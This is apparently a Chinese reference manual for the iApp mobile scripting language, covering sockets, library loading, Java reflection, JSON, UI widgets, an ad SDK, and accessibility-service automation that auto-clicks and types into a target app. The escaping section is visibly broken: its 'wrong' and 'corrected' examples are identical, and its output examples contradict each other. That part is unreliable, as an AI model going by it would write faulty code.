<p>//将字符串转换成 byte[] 字节数组对象<br>otob(“str”, “utf-8”, “nihao”, b)<br>syso(b)</p>
<p>说明：<br>将字符或文件转换为字节组</p>
<p>【btoo 字节组还原】<br>用法：<br>otob(“%abc.txt”, b)<br>//将字节组转换为文件，变量 b 可为byte[] 字节数组对象<br>btoo(b, “%abc2.txt”)</p>
<p>otob(“utf-8”, “nihao”, b)<br>//字节组转换为字符串，变量 b 可为byte[] 字节数组对象<br>btoo(“utf-8”, b, c)<br>syso(c)</p>
<p>//不设置编码，变量 b 可为byte[] 字节数组对象<br>btoo(null, b, c)</p>
<p>说明：<br>将字节组转换为字符或文件</p>
<p>【sot Socket网络通信】<br>用法：<br>//服务端<br>//服务端口，临时文件目录，接受客户超时，客户连接超时，是否覆盖文件<br>sot(8668, “%iApp/tempSocket”, 0, 0, false, b)<br>{<br>//消息内容<br>syso(st_msG)<br>//连接对象<br>syso(st_ssR)</p>
<p>}</p>
<p>//客户端<br>//服务地址，服务端口，服务连接超时，是否覆盖文件<br>sot(“192.168.1.100”, 8668, 0, false, b)<br>{<br>//消息内容<br>syso(st_msG)<br>//连接对象<br>syso(st_ssR)</p>
<p>}</p>
<p>//发送字符串，必须放在线程内<br>sot(b, “str”, “nihao”)</p>
<p>//发送文件，必须放在线程内<br>sot(b, “file”, “%abc.txt”)</p>
<p>//发送字节组，必须放在线程内<br>otob(“utf-8”, “nihao”, c)<br>sot(b, “bt”, c)</p>
<p>//发送不带信息头 byte[]字节组，必须放在线程内<br>sot(b, “bt2”, bytes)</p>
<p>//关闭释放sot<br>sot(b, “re”)</p>
<p>//获取sot是否已释放<br>sot(b, “ip”, c)</p>
<p>//获取ID总数<br>sot(b, “id”, c)</p>
<p>//获取连接对象列表<br>sot(b, “list”, c)</p>
<p>//获取连接对象列表的第一位<br>sot(b, “list”, 0, c)</p>
<p>//获取连接总数<br>sot(b, “size”, c)</p>
<p>//是否允许接受新连接<br>sot(b, “new”, true)</p>
<p>说明：<br>Socket 管理操作。服务端发送消息将批量发送给所有连接。</p>
<p>服务端说明：<br>要求：<br>1.能连接公共网络 或 内网<br>2.拥有固定IP作为客户端连接的目标<br>3.电脑、手机、平板电脑等设备上运行服务端。<br>4.可使用iapp在自己的手机上面开发服务端，并运行服务端。</p>
<p>客户端说明：<br>要求：<br>1.能连接公共网络 或 内网<br>2.可使用iapp在自己的手机上面开发客户端，并连接服务端。</p>
<p>常见开发：<br>使用手机或电脑作为服务端，手机客户端与服务端相互传递文件、数据等。</p>
<p>【sota 单个Socket通信操作】<br>用法：<br>//获取连接对象列表的第一位，变量“c”属于单个Socket通信<br>sot(b, “sl”, 0, c)</p>
<p>//获取通信对方的IP<br>sota(c, “ht”, d)</p>
<p>//获取sota是否已释放<br>sota(c, “ip”, d)</p>
<p>//关闭释放sota<br>sota(c, “re”)</p>
<p>//获取socket对象<br>sota(c, “socket”, d)</p>
<p>//获取连接对象ID<br>sota(c, “id”, d)</p>
<p>//发送字符串，必须放在线程内<br>sota(c, “str”, “nihao”)</p>
<p>//发送文件，必须放在线程内<br>sota(c, “file”, “%abc.txt”)</p>
<p>//发送字节组，必须放在线程内<br>otob(“utf-8”, “nihao”, d)<br>sota(c, “bt”, d)</p>
<p>//发送不带信息头 byte[]字节组，必须放在线程内<br>sota(c, “bt2”, bytes)</p>
<p>说明：<br>常用于单个Socket通信的操作管理</p>
<p>【loadso 加载动态库】<br>用法：<br>//比如加载 libabc.so<br>loadso(“abc”)</p>
<p>说明：<br>加载SO动态链接库。</p>
<p>【loadjar 加载jar库】<br>用法：<br>//比如加载 abc.jar<br>//赋值变量 库对象<br>loadjar(“abc.jar”, b)<br>syso(b)</p>
<p>//比如加载 abc.apk<br>//包含Activity需要传入true，赋值变量 库对象<br>loadjar(“abc.apk”, true, b)<br>syso(b)</p>
<p>说明：<br>用于加载一些jar，dex，apk 的 sdk。需要把jar文件载入至项目资源，加载过程将联网校验。<br>如果附带SO动态链接库，需要把SO文件载入至项目资源。</p>
<p>【cls 获取完整接口类】<br>用法：<br>//获取一个类，输入完整类名如 java.lang.Math<br>//赋值变量 类对象<br>cls(“java.lang.Math”, a)<br>syso(a)</p>
<p>//获取一个字符串类，常用类型可直接输入类名如 String<br>cls(“String”, b)<br>syso(b)</p>
<p>//加载SDK abc.jar，并获取SDK里一个类 输入完整类名 com.sdk.abc<br>loadjar(“abc.jar”, a)<br>cls(a, “com.sdk.ceshi”, c)<br>syso(c)</p>
<p>用法：<br>获取一个类；或从 jar SDK包获取类；</p>
<p>注意：完整类名区分大小写</p>
<p>【clssm 获取类的所有接口】<br>用法：<br>cls(“String”, b)</p>
<p>//获取所有构造函数<br>clssm(b, “init”, c)</p>
<p>//获取所有函数方法<br>clssm(b, “method”, c)</p>
<p>//获取所有变量<br>clssm(b, “field”, c)</p>
<p>说明：<br>返回一个数组。</p>
<p>【java 调用java代码方法】<br>用法：<br>//调用java api java.lang.String.indexOf(String string) 查询字符56 在123456789 中位置<br>cls(“String”, c)<br>javax(a, “123456789”, c, “indexOf”, “String”, “56”)<br>syso(a)</p>
<p>//初始化一个StringBuilderd<br>javanew(a, “java.lang.StringBuilder”, “String”, “12345”)<br>java(b, a, “java.lang.StringBuilder.append”, “String”, “6789”)<br>java(c, a, “java.lang.StringBuilder.toString”)<br>syso(c)</p>
<p>loadjar(“test.jar”, jar)<br>cls(jar, “com.sdk.ceshi”, c1)<br>//调用静态方法 com.sdk.ceshi类 c 方法<br>javax(c, null, c1, “c”, “int”, 123)<br>syso(c)</p>
<p>//调用静态变量 com.sdk.ceshi类 a 变量<br>javags(c, null, c1, “a”)<br>syso(c)</p>
<p>//初始化com.sdk.ceshi类<br>//输入赋值对象变量，输入完整类名或 cls方法的赋值变量<br>javanew(a, c1)</p>
<p>//访问变量，com.sdk.ceshi类 b变量<br>javags(c, a, c1, “b”)<br>syso(c)</p>
<p>//设置变量，com.sdk.ceshi类 b变量<br>javass(c, a, c1, “b”, “123456”)<br>syso(c)</p>
<p>//设置回调方法<br>javanew(a, “android.widget.TextView”, “android.content.Context”, activity)<br>java(b, a, “android.widget.TextView.setText”, “CharSequence”, “我是文本控件”)<br>//注意回调接口类名前面需要加一个“.”，如.android.view.View.OnClickListener<br>java(b, a, “android.view.View.setOnClickListener”, “.android.view.View$OnClickListener”, null)<br>{<br>//系统赋值<br>syso(st_mD)<br>syso(st_aS)</p>
<p>}</p>
<p>说明：<br>支持 android 所有的api；以及 自加载的jar SDK 的 api </p>
<p>注意：完整类名或 方法名 或 变量名 区分大小写</p>
<p>activity：默认变量 Activity组件</p>
<p>javax 与 java 方法区别：<br>javax：第3位参数完整类名，第4位参数方法名。类名可传入 cls方法的赋值变量；<br>java：第3位参数 完整类名和方法名。</p>
<p>【javax 调用java代码方法】<br>用法：<br>loadjar(“test.jar”, jar)<br>cls(jar, “com.sdk.ceshi”, c1)<br>//调用静态方法 com.sdk.ceshi类 c 方法<br>javax(c, null, c1, “c”, “int”, 123)<br>syso(c)</p>
<p>//调用静态变量 com.sdk.ceshi类 a 变量<br>javags(c, null, c1, “a”)<br>syso(c)</p>
<p>//初始化com.sdk.ceshi类<br>//输入赋值对象变量，输入完整类名或 cls方法的赋值变量<br>javanew(a, c1)</p>
<p>//访问变量，com.sdk.ceshi类 b变量<br>javags(c, a, c1, “b”)<br>syso(c)</p>
<p>//设置变量，com.sdk.ceshi类 b变量<br>javass(c, a, c1, “b”, “123456”)<br>syso(c)</p>
<p>说明：<br>常用于自定义SDK加载后的操作。</p>
<p>javax：第3位参数完整类名，第4位参数方法名。类名可传入 cls方法的赋值变量；</p>
<p>【javacb 自定义回调】<br>用法：</p>
<p>loadjar(“test.jar”, jar)<br>cls(jar, “com.ceshi.dex.main”, c1)<br>javanew(o, c1)<br>cls(jar, “com.ceshi.dex.main$huidiao”, c2)</p>
<p>javacb(hd, c2)<br>{<br>//系统赋值<br>syso(st_mD)<br>syso(st_aS)</p>
<p>}</p>
<p>//设置回调<br>javax(a, o, c1, “sethuidiao”, c2, hd)<br>//调用回调方法<br>javax(a, o, c1, “get”, “String”, “666”)</p>
<p>说明：<br>常用于设置自定义SDK的回调方法。</p>
<p>【res 安装包资源管理器】<br>用法：<br>//获取应用自己的对象<br>res(a)</p>
<p>//获取其他apk安装包内的资源对象，只支持加载SD卡上的apk<br>res(“%abc.apk”, a)</p>
<p>//获取资源<br>//输入资源对象，输入资源标识或文件名(没后缀)，输入资源类型，输入赋值变量<br>res(a, “ic_launcher”, “drawable”, b)</p>
<p>//获取资源ID，打包测试才有效<br>res(a, “ic_launcher”, “drawable”, false, b)</p>
<p>//获取 AssetManager 或 Resources 对象<br>res(a, “asset”, b)<br>res(a, “resources”, b)</p>
<p>说明：<br>可获取的资源类型 drawable、string、color、stringarray、layout</p>
<p>【call 交互式语言调用】<br>用法：</p>
<p>//输入赋值变量，语言类型，模块m的abc方法，输入参数1，输入参数2<br>call(null, “myu”, “m.abc”, “nihao”, 66)</p>
<p>//输入赋值变量，语言类型，模块mk的abc方法，输入参数1<br>call(a, “mlua”, “mk.abcd”, 123)</p>
<p>//输入赋值变量，语言类型，模块mk的abc方法，，输入参数1，输入参数2，输入参数3<br>call(a, “mjava”, “mk.abcd”, 123, 456, 789 )</p>
<p>//没有参数的<br>//输入赋值变量，语言类型，模块mk的abc方法<br>call(null, “mjs”, “mk.abcdf”)</p>
<p>说明：<br>用于多语言的代码交互。</p>
<p>注意：<br>此方法只能调用模块方法，输入是字符串如 m.abc 模块m 的abc方法</p>
<p>注意：<br>参数数量要与实际模块方法的参数的数量一致。</p>
<p>注意：<br>三种语言，只有 mlua 可以返回赋值变量，裕语言可以通过设置全局变量变相返回变量， mjs设置赋值变量无效。</p>
<p>【json json数据解析】<br>用法：<br>//解析json数据<br>s text = “{“id”:1, “name”:”xiaobai”, “age”:16}”<br>json(text, jo)<br>//获取id<br>json(jo, “get”, “id”, a)<br>syso(a)<br>//获取name<br>json(jo, “get”, “name”, b)<br>syso(b)<br>//获取age<br>json(jo, “get”, “age”, c)<br>syso(c)</p>
<p>//修改age数据<br>json(jo, “set”, “age”, 20)</p>
<p>//删除id数据<br>json(jo, “del”, “id”)</p>
<p>//打印json数据<br>json(jo, “json”, text)<br>syso(text)</p>
<p>//解析json列表数据<br>s text = “{“userlist”:[{“id”:1, “name”:”niubi”, “age”:16},{“id”:2, “name”:”wangba”, “age”:18},{“id”:3, “name”:”goudan”, “age”:17}]}”<br>json(text, jo)</p>
<p>//打印json数据<br>json(jo, “list”, “userlist”, list)<br>json(list, “size”, size)<br>w(size &gt; 0)<br>{<br>s-(1, size)<br>json(list, “data”, size, item)</p>
<p>//获取id<br>json(item, “get”, “id”, a)<br>syso(a)<br>//获取name<br>json(item, “get”, “name”, b)<br>syso(b)<br>//获取age<br>json(item, “get”, “age”, c)<br>syso(c)</p>
<p>}</p>
<p>说明：<br>常用于解析服务器反馈的数据。</p>
<p>【utb Toolbar工具栏设置】<br>用法：</p>
<p>//设置自定义的工具栏 为当前界面的工具栏<br>//输入Toolbar工具栏的 控件id或控件对象<br>s id = 3<br>utb(id)</p>
<p>//绑定侧滑控件，侧滑控件内需要包含左侧滑，绑定后可以在Toolbar工具栏的左图标 控制左边侧滑<br>//输入Toolbar工具栏的 控件id或控件对象，输入侧滑的 控件id或控件对象<br>utb(3, 2)</p>
<p>//设置参数</p>
<p>s id = 3<br>utb(“set”, “dshe”, true)</p>
<p>//设置左图标，可以设置事件监听<br>utb(“left”, id, “@a.png”)</p>
<p>//设置左图标的点击事件，注意此代码需在 utb(id) 后，否则事件将无效。<br>utb(“set”, “leftck”, id)<br>{<br>syso(“lefticon”)<br>}</p>
<p>//设置右菜单图标，无事件。可使用界面菜单事件<br>utb(“right”, id, “@b.png”)</p>
<p>//标题<br>utb(“set”, “title”, “apptitle”)</p>
<p>//子标题<br>utb(“set”, “subtitle”, “appsubtitle”)</p>
<p>//自定义布局可输入View类型布局<br>utb(“set”, “cv”, v)</p>
<p>//显示选项<br>utb(“set”, “do”, 0)</p>
<p>//显示或隐藏 标题<br>utb(“set”, “dste”, true)</p>
<p>//显示或隐藏 自定义布局<br>utb(“set”, “dsce”, true)</p>
<p>//显示或隐藏 主页图标<br>utb(“set”, “dshe”, true)</p>
<p>//获取参数</p>
<p>//标题<br>utb(“get”, “title”, c)</p>
<p>//子标题<br>utb(“get”, “subtitle”, c)</p>
<p>//自定义布局可输入View类型布局<br>utb(“get”, “cv”, c)</p>
<p>//显示选项<br>utb(“get”, “do”, c)</p>
<p>//动作栏布局高度<br>utb(“get”, “height”, c)</p>
<p>说明：<br>常用于设计应用顶部工具栏。</p>
<p>【tws 弹窗提醒】<br>用法：<br>//获取展示的控件对象，提醒将在这个控件里展示<br>gvs(1, v)</p>
<p>//无按钮弹出提醒<br>//输入控件对象可设置null，输入字符，输入显示时长（值0 -1 -2）<br>tws(v, “ni hao!”, 0)</p>
<p>//有按钮弹出提醒<br>//输入控件对象可设置null，输入字符，输入显示时长（值0 -1 -2），输入按钮标题<br>tws(v, “ni hao ma?”, 0, “hao”)<br>{<br>syso(“go”)<br>}</p>
<p>【uht 滑动窗体控制】<br>用法：</p>
<p>//添加新的页面，设置的界面会执行载入事件里的代码<br>//输入滑动窗体的 控件id或控件对象，输入标识，输入插入序号 如-1为尾部 0为头部，输入标题，输入界面名，输入控件对应的数据项…不限制数量可参考代码ula<br>uht(2, “add”, -1, “标题”, “a.iyu”, 1=”abc”, 2=”bac”, 3=”bbc”)</p>
<p>//删除界面<br>//输入滑动窗体的 控件id或控件对象，输入标识，输入界面序号 序号以0开始 -1为尾部<br>uht(2, “del”, 0)</p>
<p>//修改界面标题<br>//输入滑动窗体的 控件id或控件对象，输入标识，输入界面序号 序号以0开始 -1为尾部<br>uht(2, “title”, 0, “标题2”)</p>
<p>//获取页面总数<br>uht(2, “size”, b)<br>syso(b)</p>
<p>//释放内存<br>uht(2, “close”)</p>
<p>//绑定标签布局，绑定后滑动界面时标签布局会跟随运动，需要注意 标签布局 和 滑动窗体 的子项数量应一致，新增子项时也需要同时增加<br>//输入滑动窗体的 控件id或控件对象，输入标识，输入标签布局的 控件id或控件对象，是否应刷新其内容<br>uht(2, “bd”, 3, true)<br>//注意：如果绑定前 标签布局 如有设置子项，绑定时会被清空。绑定后直接添加滑动窗体 的子项并设置 标题</p>
<p>//增加标签布局 的子项<br>us(3, “app_tabadd”, “选项”)</p>
<p>//添加滑动窗体 的子项<br>uht(2, “add”, -1, “标题”, “a.iyu”, 1=”abc”, 2=”bac”, 3=”bbc”)</p>
<p>说明：<br>用于动态管理控制滑动窗体和垂直滑动窗体的 新增页面、删除页面、绑定标签布局等。</p>
<p>【cast 强制转换数据类型】<br>用法：</p>
<p>s a = 123<br>//转换数据类型并直接赋值<br>//输入完整类名 或 类对象，输入需要转换的数据变量<br>cast(“String”, a)<br>syso(a)</p>
<p>//获取类对象<br>cls(“java.lang.Math”, a)<br>//输入完整类名 或 类对象，输入需要转换的数据变量，输入赋值变量<br>cast(a, b, c)<br>syso(c)</p>
<p>说明：<br>常用于数据强制转换。</p>
<p>【yul 加载yul布局】<br>用法：</p>
<p>//将布局加载展示到指定的布局控件里<br>//输入控件id或控件对象（比如输入线性布局ID），输入 yul 布局文件名<br>yul(1, “a.yul”)</p>
<p>//返回布局对象<br>//输入 yul 布局文件名，输入赋值变量返回一个View对象<br>yul(“a.yul”, a)<br>syso(a)</p>
<p>说明：<br>yul布局是以 android 的 xml布局为基础，用于动态加载布局到应用界面。和安卓xml布局用法和代码都是一致的。</p>
<p>在设计 yul布局 时需要自定义控件ID，如设置控件ID:123 编写代码 android:id=”123” 或 android:id=”@+id/s123” 两种写法都可以，效果都是ID为 123</p>
<p>【zj 组件控制】<br>用法：<br>//如有米广告组件，首先下载有米的组件，并且设置好组件。</p>
<p>//初始化有米SDK，放在第一个界面的载入事件里<br>//输入赋值变量，标识，发布 ID，密钥，是否开启有米的Log输出（需要换自己的渠道信息）<br>zj(a, “init”, “String”, “85aa56a59eac8b3d”, “String”, “a14006f66f58d5d7”, “boolean”, true)</p>
<p>//初始化积分墙<br>//输入赋值变量，标识<br>zj(a, “initjfq”)</p>
<p>//展示积分墙<br>zj(a, “jfqgo”)</p>
<p>说明：<br>用于控制组件。</p>
<p>【无障碍服务】<br>用法：<br>固定模块名为 ays_service 可创建模块 ays_service.myu，代码如下：</p>
<p>//事件方法 on 实时回调变化事件<br>fn on(e)<br>//获取事件类型<br>java(b, ays, “com.iapp.app.ays.gtype”, “android.view.accessibility.AccessibilityEvent”, e)<br>//如果事件类型<br>f(b == 32 || b == 2048){<br>  //获取事件源的对象节点列表<br>  java(node, ays, “com.iapp.app.ays.gall”, “AccessibilityEvent”, e)<br>  //判断事件来源是不是包名为com.iapp.app的应用<br>  java(gpn, ays, “com.iapp.app.ays.gpn”, “AccessibilityEvent”, e)<br>  f(“com.iapp.app” == gpn)<br>  {<br>     //判断类名，根据指定的类名进行不同的操作<br>     java(gcn, ays, “com.iapp.app.ays.gcn”, “AccessibilityEvent”, e)<br>     f(“com.iapp.app.HomeMian” == gcn)<br>     {<br>        //从对象列表搜索文本为“创建”的对象，并点击该对象<br>        java(b, ays, “com.iapp.app.ays.cktext”, “AccessibilityNodeInfo”, node, “int”, 16, “String”, “创建”)<br>     }<br>     else f(“com.iapp.app.HomeAdd” == gcn)<br>     {<br>        //根据ID获取指定的节点<br>        java(b, ays, “com.iapp.app.ays.id”, “AccessibilityNodeInfo”, node, “String”, “com.iapp.app:id/ui_home_add_title”)<br>    //设置节点的文本框输入指定字符<br>        java(c, ays, “com.iapp.app.ays.enter”, “java.util.List”, b, “String”, “name”)<br>        //根据ID获取指定的节点<br>        java(b, ays, “com.iapp.app.ays.id”, “AccessibilityNodeInfo”, node, “String”, “com.iapp.app:id/ui_home_add_remark”)<br>    //设置节点的文本框输入指定字符<br>        java(c, ays, “com.iapp.app.ays.enter”, “java.util.List”, b, “String”, “remark”)<br>        //从对象列表搜索指定ID的对象，并点击该节点对象<br>        java(b, ays, “com.iapp.app.ays.ckid”, “AccessibilityNodeInfo”, node, “int”, 16, “String”, “com.iapp.app:id/ui_home_add_go”)<br>     }<br>  }<br>  //释放根源节点<br>  java(b, ays, “com.iapp.app.ays.re”, “AccessibilityNodeInfo”, node)</p>
<p>}</p>
<p>end fn</p>
<p>//初始化事件方法 onsc 启动时回调一次<br>fn onsc()<br>s pns = “com.iapp.app”<br>//设置监听指定的包名，可以设置多个包名用逗号隔开如”com.xxx.a,com.xxx.b”<br>javass(a, null, “com.iapp.app.ays.pns”, pns)<br>//设置相应时间<br>javass(a, null, “com.iapp.app.ays.nt”, 1000)<br>end fn</p>
<p>然后 权限配置管理》application配置 将下面的配置粘贴进去：<br>    <service
            android:name="com.iapp.app.ays"
            android:label="iapp开发工具无障碍辅助功能"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"><br>            <intent-filter><br>                <action android:name="android.accessibilityservice.AccessibilityService"/><br>            </intent-filter><br>            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/aya_config"/><br>        </service></p>
<p>最后，【正式打包发布】打包完成后，安装测试。记得自行去设置》辅助功能》打开我们的服务《iapp开发工具无障碍辅助功能》。<br>注意：直接在iapp里测试无效。</p>
<p>更多代码示范：</p>
<p>//——静态调用<br>//获取无障碍功能是否已经授权<br>java(a, null, “com.iapp.app.ays.isas”, “Context”, activity)</p>
<p>//如果没有授权，可跳转设置界面<br>java(a, null, “com.iapp.app.ays.goset”, “Context”, activity)</p>
<p>//——事件源操作<br>//获取Context功能类<br>java(a, ays, “com.iapp.app.ays.gbc”)</p>
<p>//获取无障碍功能配置信息<br>java(a, ays, “com.iapp.app.ays.gsi”)</p>
<p>//设置无障碍功能配置信息<br>java(b, ays, “com.iapp.app.ays.ssi”, “AccessibilityServiceInfo”, a)</p>
<p>//调用全局事件<br>//输入值：1. 返回键 2. HOME键 3. 最近打开应用列表 4. 打开通知栏 5. 设置 6. 锁屏<br>java(a, ays, “com.iapp.app.ays.pga”, “int”, 1)</p>
<p>//获取事件类型<br>//值：32 打开PopupWindow，Menu，Dialog等的事件  64 显示通知的事件  2048 更改窗口内容的事件  4194304 屏幕上显示的窗口中的事件更改<br>java(a, ays, “com.iapp.app.ays.gtype”, “AccessibilityEvent”, e)</p>
<p>//获取事件源类的类型<br>java(a, ays, “com.iapp.app.ays.gcn”, “AccessibilityEvent”, e)</p>
<p>//获取事件源的包名<br>java(a, ays, “com.iapp.app.ays.gpn”, “AccessibilityEvent”, e)</p>
<p>//获取事件源的是否可用<br>java(a, ays, “com.iapp.app.ays.ised”, “AccessibilityEvent”, e)</p>
<p>//获取事件源的节点总数<br>java(a, ays, “com.iapp.app.ays.gsl”, “AccessibilityEvent”, e)</p>
<p>//获取事件源的整数ID<br>java(a, ays, “com.iapp.app.ays.gwid”, “AccessibilityEvent”, e)</p>
<p>//获取事件源的时间<br>java(a, ays, “com.iapp.app.ays.gtime”, “AccessibilityEvent”, e)</p>
<p>//释放资源<br>java(a, ays, “com.iapp.app.ays.re”, “AccessibilityEvent”, e)</p>
<p>//——节点的操作<br>//获取事件源的节点对象列表<br>java(a, ays, “com.iapp.app.ays.gall”, “AccessibilityEvent”, e)</p>
<p>//获取窗口的对象节点列表，需要Android 4.1及以上才可调用<br>java(a, ays, “com.iapp.app.ays.gall”)</p>
<p>//根据序号；获取对象的子节点<br>java(a, ays, “com.iapp.app.ays.gi”, “AccessibilityNodeInfo”, node, “int”, 0)</p>
<p>//获取对象的子节点总数<br>java(a, ays, “com.iapp.app.ays.gi”, “AccessibilityNodeInfo”, node)</p>
<p>//根据当前焦点向某个方向进行搜索可以获得输入焦点的最近控件<br>//输入值：33 向上  130 向下  17 向左  66 向右<br>java(a, ays, “com.iapp.app.ays.focussearch”, “AccessibilityNodeInfo”, node, “int”, 130)</p>
<p>//根据文本查询控件，返回节点列表<br>java(nodelist, ays, “com.iapp.app.ays.text”, “AccessibilityNodeInfo”, node, “String”, “创建”)</p>
<p>//根据id查询控件，返回节点列表<br>java(nodelist, ays, “com.iapp.app.ays.id”, “AccessibilityNodeInfo”, node, “String”, “com.iapp.app:id/ui_home_add_go”)</p>
<p>//根据焦点查询<br>//输入值：1 输入焦点  2 可访问性焦点<br>java(a, ays, “com.iapp.app.ays.focus”, “AccessibilityNodeInfo”, node, “int”, 1)</p>
<p>//获取节点文本<br>java(a, ays, “com.iapp.app.ays.gt”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点类的类型<br>java(a, ays, “com.iapp.app.ays.gcn”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点整数ID<br>java(a, ays, “com.iapp.app.ays.gwid”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点ID<br>java(a, ays, “com.iapp.app.ays.gid”, “AccessibilityNodeInfo”, node)</p>
<p>//获取可以在节点上执行的操作<br>java(a, ays, “com.iapp.app.ays.gal”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点在屏幕上坐标<br>java(a, ays, “com.iapp.app.ays.gbis”, “AccessibilityNodeInfo”, node)</p>
<p>//获取父节点在屏幕上坐标<br>java(a, ays, “com.iapp.app.ays.gbip”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点的包名<br>java(a, ays, “com.iapp.app.ays.gpn”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点的父节点<br>java(a, ays, “com.iapp.app.ays.gp”, “AccessibilityNodeInfo”, node)</p>
<p>//获取此节点是否可点击<br>java(a, ays, “com.iapp.app.ays.isck”, “AccessibilityNodeInfo”, node)</p>
<p>//获取此节点是否已启用<br>java(a, ays, “com.iapp.app.ays.ised”, “AccessibilityNodeInfo”, node)</p>
<p>//获取此节点是否已选中<br>java(a, ays, “com.iapp.app.ays.iscd”, “AccessibilityNodeInfo”, node)</p>
<p>//获取这个节点是否被聚焦<br>java(a, ays, “com.iapp.app.ays.isfd”, “AccessibilityNodeInfo”, node)</p>
<p>//获取此节点是否可以长时间点击<br>java(a, ays, “com.iapp.app.ays.islck”, “AccessibilityNodeInfo”, node)</p>
<p>//获取此节点是否是密码<br>java(a, ays, “com.iapp.app.ays.ispd”, “AccessibilityNodeInfo”, node)</p>
<p>//获取节点是否可滚动<br>java(a, ays, “com.iapp.app.ays.isse”, “AccessibilityNodeInfo”, node)</p>
<p>//获取是否选择此节点<br>java(a, ays, “com.iapp.app.ays.issd”, “AccessibilityNodeInfo”, node)</p>
<p>//根据文本查询；模拟控件点击控件<br>java(a, ays, “com.iapp.app.ays.cktext”, “AccessibilityNodeInfo”, node, “int”, 16, “String”, “创建”)</p>
<p>//根据ID查询；模拟控件点击控件<br>java(a, ays, “com.iapp.app.ays.ckid”, “AccessibilityNodeInfo”, node, “int”, 16, “String”, “com.iapp.app:id/ui_home_add_go”)</p>
<p>//根据焦点查询；模拟控件点击控件<br>//输入值：1 输入焦点  2 可访问性焦点<br>java(a, ays, “com.iapp.app.ays.ckfocus”, “AccessibilityNodeInfo”, node, “int”, 16, “int”, 1)</p>
<p>​    /.<br>​      模拟执行操作<br>​      1 将输入焦点输入到节点的操作<br>​      16 点击节点信息的动作<br>​      32 长时间点击节点的动作<br>​      32768 操作来粘贴当前的剪贴板内容<br>​     ./<br>//开始模拟控件点击<br>//输入节点列表<br>java(b, ays, “com.iapp.app.ays.ck”, “java.util.List”, nodelist, “int”, 16)</p>
<p>//开始模拟控件点击<br>//输入节点列表，输入自定义的Bundle<br>java(b, ays, “com.iapp.app.ays.ck”, “java.util.List”, nodelist, “int”, 16, “android.os.Bundle”, be)</p>
<p>//对单项模拟控件点击<br>//输入节点列表<br>java(b, ays, “com.iapp.app.ays.ck”, “AccessibilityNodeInfo”, node, “int”, 16)</p>
<p>//对单项模拟控件点击<br>//输入节点列表，输入自定义的Bundle<br>java(b, ays, “com.iapp.app.ays.ck”, “AccessibilityNodeInfo”, node, “int”, 16, “android.os.Bundle”, be)</p>
<p>//对单项模拟执行输入文本,Android 4.3 版本及以上<br>java(b, ays, “com.iapp.app.ays.enter”, “AccessibilityNodeInfo”, node, “String”, “nihao”)</p>
<p>//开始模拟执行输入文本,Android 4.3 版本及以上<br>java(b, ays, “com.iapp.app.ays.enter”, “java.util.List”, nodelist, “String”, “nihao”)</p>
<p>//获取节点所有子节点列表<br>java(nodelist, ays, “com.iapp.app.ays.ganiall”, “AccessibilityNodeInfo”, node)</p>
<p>//释放节点资源<br>java(b, ays, “com.iapp.app.ays.re”, “AccessibilityNodeInfo”, node)</p>
<p>说明：<br>无障碍功能（辅助功能）常用于简化操作，使应用或 系统的变得更智能、简便。</p>
<p>【自定义代码提示】<br>说明：<br>iapp允许开发者自定义代码提示，这样可以最大程度保留开发者的个人习惯，可以定义成你自己熟悉的关键词。</p>
<p>格式：<br>代码\说明<br>如：<br>abcde\变量名<br>abc()\方法名</p>
<p>配置对应文件：/data/data/com.iapp.app/files/config/srctonew.xml</p>
<p>【HTML5项目】<br>例子：<br>//输入浏览器控件ID或对象，输入标识，输入项目网页路径<br>us(1, “url”, “@html5/index.html”)<br>//us(1, “url”, “%html5/index.html”)</p>
<p>说明：<br>常用与运行一个HTML5项目，包括HTML5应用、HTML5游戏等。</p>
<p>【上传项目】</p>
<p>项目内导入覆盖规则：</p>
<p>​    综合：一个完整应用项目的导入；先清空当前项目源码与资源后，导入源码与资源 以及根据需求导入项目信息与图标</p>
<p>​    其他分类通用：<br>​    1. 项目中mian.iyu启动界面，只导入其中有备注的控件，导入至当前项目打开的界面里；<br>​    2. 不清空当前项目文件，直接覆盖除了mian.iyu以外的其他所有界面与资源；<br>​    3. 覆盖过程如有模块文件重复，将以追加方式模块增加，不覆盖；<br>​    4. 建议复杂命名界面名，复杂命名模块方法名；</p>
<p>项目外导入覆盖规则：<br>    1. 遇本地重复项目，不覆盖。<br>    2. 导入为完整项目。</p>
<p>说明：<br>分享技术，享受乐趣。</p>
<p>【代码规范】<br>例子：<br>//下面的判断语句，使用了字符串；存在规范问题，会出错；<br>f(“1?2(3}4,5==6” == “1?2(3}4,5==6”)<br>{<br>f(“a”!=sb” != “a”!=sb6”)<br>{<br>tw(“{1},(2)”)<br>}<br>}</p>
<p>转义关键符号，需修正为：<br>f(“1?2(3}4,5==6” == “1?2(3}4,5==6”)<br>{<br>f(“a”!=sb” != “a”!=sb6”)<br>{<br>tw(“{1},(2)”)<br>}<br>}</p>
<p>//下面判断读取文本文件，<br>fr(“%ab,c.txt”, “utf-8”, c)<br>tw(c)</p>
<p>转义关键符号，需修正为：<br>fr(“%ab,c.txt”, “utf-8”, c)<br>tw(c)</p>
<p>以上为规范异常，系统关键符号需要进行转义，转义在符号前增加“\”。</p>
<p>系统关键符号(小写符号)：( ) , = ! &gt; &lt; ? * + { } | &amp;</p>
<p>注意：<br>“\”作为转义符号需注意例子：</p>
<p>.例子1<br>tw(“ni\nhao”)<br>/.<br>输出：<br>ni<br>hao<br>./</p>
<p>.例子2<br>tw(“ni\nhao”)<br>/.<br>输出：<br>ni\nhao<br>./</p>
<p>.例子3<br>tw(“ni\hao”)<br>/.<br>输出：<br>ni\hao<br>./</p>
<p>.例子4<br>tw(“ni\hao”)<br>/.<br>输出：<br>ni\hao<br>./</p>
<p>.例子5<br>tw(“ni\\hao”)<br>/.<br>输出：<br>ni\hao<br>./</p>
<p>.例子6<br>tw(“ni,hao”)<br>/.<br>输出：<br>ni,hao<br>./</p>
<p>【单击触屏事件】</p>
<p>系统赋值：<br>st_vId：控件id<br>st_vW：控件对象</p>
<p>说明：<br>该事件无返回值，当用户完成单击触屏即执行事件代码。</p>
<p>【触屏监听事件】<br>用法：<br>[true]<br>tw(“将返回值为true”)</p>
